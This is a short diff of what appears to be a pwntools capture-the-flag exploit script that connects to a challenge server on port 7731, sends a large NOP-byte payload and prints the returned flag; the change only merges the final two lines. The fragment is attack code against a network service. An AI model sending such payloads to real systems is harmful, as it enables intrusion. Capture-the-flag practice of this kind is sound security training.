@@ -12,6 +12,5 @@ conn = remote(server_ip,7731)
 
 data = asm('nop') * 128000
 conn.sendline(data)
-flag = conn.recvuntil(b'}')
-print(flag)
+print(conn.recvuntil(b'}'))
 ```
